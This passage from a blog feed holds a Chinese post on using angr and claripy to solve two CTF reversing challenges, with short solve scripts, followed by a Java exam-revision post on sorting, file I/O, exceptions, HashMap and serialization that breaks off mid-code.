        <content type="html"><![CDATA[<p>记载angr的相关用法以及例题</p><span id="more"></span><p>这么强有力的工具还是要尽可能熟悉掌握用法</p><h1 id="相关用法"><a href="#相关用法" class="headerlink" title="相关用法"></a>相关用法</h1><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>github上angr开发者给了一大堆例子<br><a href="https://github.com/angr/angr-doc/tree/master/examples" target="_blank">here</a></p><p>还有angrctf可以很好的练习 慢慢练吧</p><h2 id="网鼎杯-2020-青龙组-singal"><a href="#网鼎杯-2020-青龙组-singal" class="headerlink" title="[网鼎杯 2020 青龙组]singal"></a>[网鼎杯 2020 青龙组]singal</h2><p>最简单的angr应用<br>一道简单的vm题<br>只是由于过于简单 不涉及jmp和堆栈操作 所以angr可以一把梭</p><p>关键在于找对find和avoid<br>这题的find我们找的是正常结束vm_operad的返回点<br>avoid找的是printf what a shame 的点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> angr <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">project = Project(<span class="string">&#x27;signal.exe&#x27;</span>) <span class="comment"># 创建项目 加载二进制文件</span></span><br><span class="line">state = project.factory.entry_state() <span class="comment"># 创建state</span></span><br><span class="line">sim = project.factory.simgr(state) <span class="comment"># 创建sim</span></span><br><span class="line">sim.explore(find=<span class="number">0x40175E</span>,avoid=<span class="number">0x4016E6</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sim.found:</span><br><span class="line">    res = sim.found[<span class="number">0</span>]</span><br><span class="line">    res = res.posix.dumps(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Success! The solution is <span class="subst">&#123;res.decode()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="WUSTCTF2020-funnyre"><a href="#WUSTCTF2020-funnyre" class="headerlink" title="[WUSTCTF2020]funnyre"></a>[WUSTCTF2020]funnyre</h2><p>angr+claripy的进阶用法</p><p>IDA去除花指令 发现是一大堆变换<br>每次变换都是数组一起变换的<br>也就是key是统一的<br>先xor 然后有个取反 再xor 最后+<br>常规做法直接枚举三个key即可</p><p>至于angr的解法<br>设置了flag变量 32个byte 将其存在内存中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">p=angr.Project(<span class="string">&#x27;funnyre&#x27;</span>)</span><br><span class="line">f=p.factory</span><br><span class="line">state = f.entry_state(addr=<span class="number">0x400605</span>)<span class="comment">#设置state开始运行时的地址</span></span><br><span class="line">flag = claripy.BVS(<span class="string">&#x27;flag&#x27;</span>,<span class="number">8</span>*<span class="number">32</span>)<span class="comment">#要求的内容有32个，用BVS转成二进制给flag变量</span></span><br><span class="line">state.memory.store(<span class="number">0x603055</span>+<span class="number">0x300</span>+<span class="number">5</span>,flag)<span class="comment">#因为程序没有输入，所以直接把字符串设置到内存</span></span><br><span class="line">state.regs.rdx=<span class="number">0x603055</span>+<span class="number">0x300</span></span><br><span class="line">state.regs.rdi=<span class="number">0x603055</span>+<span class="number">0x300</span>+<span class="number">5</span><span class="comment">#然后设置两个寄存器</span></span><br><span class="line"></span><br><span class="line">sm = p.factory.simulation_manager(state)<span class="comment">#准备从state开始遍历路径</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ready&quot;</span>)</span><br><span class="line"></span><br><span class="line">sm.explore(find=<span class="number">0x401DAE</span>)<span class="comment">#遍历到成功的地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sm.found:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sucess&quot;</span>)</span><br><span class="line">    x=sm.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(flag,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF-Re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java-考试复习</title>
      <link href="/Java-%E8%80%83%E8%AF%95%E5%A4%8D%E4%B9%A0/"/>
      <url>/Java-%E8%80%83%E8%AF%95%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>记录对于本学期选修课Java程序设计的有关复习</p><span id="more"></span><p>思维难度肯定不大 重点就是能熟练掌握各种操作 文件I&#x2F;O 序列化&#x2F; 类继承&#x2F;重写&#x2F;… 异常抛出以及自定义处理 等<br><strong><em>RP++</em></strong></p><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h2 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[] a = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line">Integer[] a = <span class="keyword">new</span> <span class="title class_">Integer</span>[<span class="number">10</span>];</span><br></pre></td></tr></table></figure><h2 id="Arrays"><a href="#Arrays" class="headerlink" title="Arrays"></a>Arrays</h2><p>用Arrays有时能比较方便的直接sort&#x2F;二分查找<br>用法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> Arrays.toString(a); <span class="comment">// 输出 [1,2,3,...]</span></span><br><span class="line">Arrays.sort(a); <span class="comment">// 默认按升序排列</span></span><br><span class="line"><span class="type">int</span> <span class="variable">pos</span> <span class="operator">=</span> Arrays.binarySearch(a,<span class="number">5</span>); <span class="comment">// 排序好后可以直接调用二分查找</span></span><br></pre></td></tr></table></figure><p>当然也可以用Arrays来实现自定义排序 和以前用的Collection一样 自定义一个继承实现<br>具体实现:</p><h3 id="自定义排序"><a href="#自定义排序" class="headerlink" title="自定义排序"></a>自定义排序</h3><p>其实把Arrays.sort() 改为 Collections.sort()更好 更兼容<br>注意！！！<br><strong>return 1&#x2F;-1 !!!</strong><br>md …</p><h4 id="Integer"><a href="#Integer" class="headerlink" title="Integer"></a>Integer</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyCompare</span> <span class="keyword">implements</span> <span class="title class_">Comparator</span>&lt;Integer&gt;&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Integer o1, Integer o2)</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(o1&gt;o2) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于这里的接口写的Integer 所以a数组也要定义成Integer 而且Comparator里面是没有int类型的 必须用Integer!</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Integer[] a = <span class="keyword">new</span> <span class="title class_">Integer</span>[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++) &#123;</span><br><span class="line">a[i] = <span class="number">10</span>-i;</span><br><span class="line">&#125;</span><br><span class="line">a[<span class="number">9</span>] = <span class="number">11</span>;</span><br><span class="line">System.out.println(a[<span class="number">2</span>]);</span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> Arrays.toString(a);</span><br><span class="line">System.out.println(str);</span><br><span class="line">Arrays.sort(a,<span class="keyword">new</span> <span class="title class_">MyCompare</span>());</span><br></pre></td></tr></table></figure><p>这样就实现了降序排列 (具体返回-1&#x2F;1 多试试就行了)<br>补: 返回1 表示我想要调整顺序  -1表示我不想调整顺序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(o1.dis(o)&gt;o2.dis(o))<span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>代表这种情况我想要交换o1,o2 所以是按照到o的距离从小到大排序</p><p>其他带字符串的 或者其他特殊比较规则的也同理</p><h4 id="String"><a href="#String" class="headerlink" title="String"></a>String</h4><p>这里的&gt;改为String 的 compareto就行了<br>例如字母降序排列</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyCompare</span> <span class="keyword">implements</span> <span class="title class_">Comparator</span>&lt;String&gt;&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(String o1, String o2)</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(o1.compareTo(o2)&gt;<span class="number">0</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String[] s = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++) &#123;</span><br><span class="line">s[i] = Character.toString((<span class="type">char</span>) (i+<span class="number">65</span>));</span><br><span class="line">&#125;</span><br><span class="line">Arrays.sort(s,<span class="keyword">new</span> <span class="title class_">MyCompare</span>());</span><br></pre></td></tr></table></figure><h1 id="I-O"><a href="#I-O" class="headerlink" title="I&#x2F;O"></a>I&#x2F;O</h1><p>这部分是重中之重 也是最繁琐的地方…<br>把大部分模板&#x2F;用法记下来 考试直接用即可</p><h2 id="普通I-O"><a href="#普通I-O" class="headerlink" title="普通I&#x2F;O"></a>普通I&#x2F;O</h2><h3 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h3><p>这部分应该不会过多考察 最多用一个 hasnextxxx来判断接下来的输入类型 抛出个异常啥的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">sc.hasNextInt();</span><br><span class="line">sc.hasNextFloat();</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="文件I-O"><a href="#文件I-O" class="headerlink" title="文件I&#x2F;O"></a>文件I&#x2F;O</h2><p>主要从文件类型来分别给出模板 (都使用try-with-resource来操作文件)</p><p><strong>注意！br开了后面一定要br.close()!!!!</strong></p><h3 id="csv文件"><a href="#csv文件" class="headerlink" title="csv文件"></a>csv文件</h3><p>这也是最常考的文件类型<br>重点掌握从.csv文件读取行&#x2F;列 (感觉应该不会要求写入csv文件吧… 肯定不可能考的…)</p><p>以模拟题为例 要读取iris.csv所有列的数据<br>是这种格式:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5.13.51.40.2setosa</span><br></pre></td></tr></table></figure><p>我们就将每行每列都当作字符串读取 然后用parsedouble把前几个转为double类型<br>这里统一用bufferreader类和filereader组合来读取<br>这里用List将lines存起来 由于每个line是csv也就是逗号隔开 所以用一个split清洗数据</p><p>写出来最初框架:   遇到这种要从.csv文件提取数据的都可以这么写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;D:\\浏览器下载\\iris.csv&quot;</span>));</span><br><span class="line">List&lt;String&gt; lines = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">String line;</span><br><span class="line"><span class="keyword">while</span>((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">lines.add(line);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">boolean</span> FirstLine=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span>(String line1:lines) &#123;</span><br><span class="line"><span class="keyword">if</span>(FirstLine==<span class="literal">true</span>) &#123;</span><br><span class="line">FirstLine = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">String[] values = line1.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line"><span class="type">double</span> <span class="variable">a</span> <span class="operator">=</span> Double.parseDouble(values[<span class="number">0</span>]);</span><br><span class="line"><span class="type">double</span> <span class="variable">b</span> <span class="operator">=</span> Double.parseDouble(values[<span class="number">1</span>]);</span><br><span class="line"><span class="type">double</span> <span class="variable">c</span> <span class="operator">=</span> Double.parseDouble(values[<span class="number">2</span>]);</span><br><span class="line"><span class="type">double</span> <span class="variable">d</span> <span class="operator">=</span> Double.parseDouble(values[<span class="number">3</span>]);</span><br><span class="line"><span class="type">String</span> <span class="variable">e</span> <span class="operator">=</span> values[<span class="number">4</span>];</span><br><span class="line"><span class="type">Flower</span> <span class="variable">tmpFlower</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Flower</span>(a, b, c, d, e);</span><br><span class="line">flower[flower_cnt] = tmpFlower;</span><br><span class="line">flower_cnt++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(Flower i:flower) &#123;</span><br><span class="line"><span class="keyword">if</span>(i!=<span class="literal">null</span>)</span><br><span class="line">System.out.println(i);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">System.out.println(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="txt文件"><a href="#txt文件" class="headerlink" title="txt文件"></a>txt文件</h3><p>要掌握.txt文件的读取和写入<br>大致写下就是这种:<br>感觉都统一BufferReader+FileReader+List(ArrayList)真香!</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;D:\\浏览器下载\\test.txt&quot;</span>));</span><br><span class="line">List&lt;String&gt; lines = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">String line;</span><br><span class="line"><span class="type">int</span> <span class="variable">line_cnt</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>((line = br.readLine())!=<span class="literal">null</span>) &#123;</span><br><span class="line">lines.add(line);</span><br><span class="line">line_cnt++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(String line1:lines) &#123;</span><br><span class="line">System.out.println(line1);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">System.out.println(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读写一起大致就是这样 写的时候都xxx.toString转一下<br>一定要close()!!! 不然写入不了！！！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//txt文件读取</span></span><br><span class="line">System.out.println(<span class="string">&quot;[+] txt &quot;</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;D:\\浏览器下载\\test.txt&quot;</span>));</span><br><span class="line">List&lt;String&gt; lines = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">String line;</span><br><span class="line"><span class="type">int</span> <span class="variable">line_cnt</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>((line = br.readLine())!=<span class="literal">null</span>) &#123;</span><br><span class="line">lines.add(line);</span><br><span class="line">line_cnt++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(String line1:lines) &#123;</span><br><span class="line">System.out.println(line1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//txt文件写入</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;[+] txt-out&quot;</span>);</span><br><span class="line"><span class="type">BufferedWriter</span> <span class="variable">br2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;D:\\浏览器下载\\test_out.txt&quot;</span>));</span><br><span class="line"><span class="keyword">for</span>(String line2:lines) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">out</span> <span class="operator">=</span> Integer.parseInt(line2);</span><br><span class="line">out += <span class="number">2</span>;</span><br><span class="line">br2.write(Integer.toString(out));</span><br><span class="line">br2.newLine();</span><br><span class="line">&#125;</span><br><span class="line">br2.close(); <span class="comment">//!!!!!!!!!!!!!!!!!!</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">System.out.println(e);</span><br><span class="line">&#125;</span><br><span class="line">br.close(); <span class="comment">//!!!!!!!!!!!!!!!!!!!!!</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">System.out.println(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><hr><p>文件I&#x2F;O大致就这两类 其他的类型应该是不会考的<br>熟练掌握运用 文件I&#x2F;O+类初始定义 就能把题目大致框架搭好 剩下的逐步填充完善就行了(面向对象自顶向下的编程思想)</p><h1 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h1><p>使用try catch 块 (考试时的文件I&#x2F;O操作强制要求)</p><h2 id="自定义异常"><a href="#自定义异常" class="headerlink" title="自定义异常"></a>自定义异常</h2><p>extends Exception 即可 (有时考试要求必须要继承某个类 这就直接继承了…)</p><p>这里放一个最简单实现的模板 (只是为了应付考试的强制要求自定义异常)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">114514L</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">MyException</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">super</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">MyException</span><span class="params">(String msg)</span> &#123;</span><br><span class="line"><span class="built_in">super</span>(msg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">MyException</span><span class="params">(String msg,Exception cause)</span> &#123;</span><br><span class="line"><span class="built_in">super</span>(msg,cause);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在函数后throw<br>比如:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MyException&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span>(ai&lt;<span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MyException</span>(<span class="string">&quot;Cannot be negative!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样虽然啥也没处理 但是能自定义抛出异常的输出语句 足以应付考试</p><h1 id="Java数据结构"><a href="#Java数据结构" class="headerlink" title="Java数据结构"></a>Java数据结构</h1><p>记录下常用的ArrayList&#x2F;Hashmap等 考试用着更加方便</p><h2 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h2><p>只需要知道add方法就够用了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; lines = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">...</span><br><span class="line">lines.add(line);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>自定义排序都用List&lt;&gt;+Collections.sort()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Collections.sort(lines,<span class="keyword">new</span> <span class="title class_">MyCompare</span>());</span><br></pre></td></tr></table></figure><h2 id="Hashmap"><a href="#Hashmap" class="headerlink" title="Hashmap"></a>Hashmap</h2><p>着重了解一下Hashmap的用法<br>在考试有关排序后统计字符串次数&#x2F;取最大等很好用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;Integer, String&gt; Sites = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer, String&gt;();</span><br><span class="line">Sites.put(<span class="number">1</span>,<span class="string">&quot;233&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> Sites.get(<span class="number">1</span>); <span class="comment">// 获取key对应的value</span></span><br><span class="line"><span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> Sites.size(); <span class="comment">// 获取hashmap中键值对个数</span></span><br></pre></td></tr></table></figure><p>重点 : 需要统计个数 并记录对应映射</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sites.put(k.getE(), Sites.getOrDefault(k.getE(), <span class="number">0</span>)+<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>取最大值:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> maxx=<span class="number">0</span>;String aString=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(String string : Sites.keySet()) &#123;</span><br><span class="line"><span class="keyword">if</span>(Sites.get(string) != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(Sites.get(string)&gt;maxx) &#123;</span><br><span class="line">maxx = Sites.get(string);</span><br><span class="line">aString = string;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Java序列化"><a href="#Java序列化" class="headerlink" title="Java序列化"></a>Java序列化</h1><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>Java一个类要能序列化 要 implements Serializable</p><p>序列化对象用到的I&#x2F;O操作均为字节流</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">ser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;D:\\浏览器下载\\answer_3.ser&quot;</span>));</span><br></pre></td></tr></table></figure><p>然后用 ser.writeObject() 写入<br>具体来说就是这种</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">xxx</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;[+] 4.&quot;</span>);</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">ser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;D:\\浏览器下载\\answer_3.ser&quot;</span>));</span><br><span class="line">Flower[] sorted_fower = <span class="keyword">new</span> <span class="title class_">Flower</span>[<span class="number">1005</span>];</span><br><span class="line">flower_cnt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(Flower i:flowerList) &#123;</span><br><span class="line">sorted_fower[flower_cnt] = i;</span><br><span class="line">flower_cnt++;</span><br><span class="line">&#125;</span><br><span class="line"><span 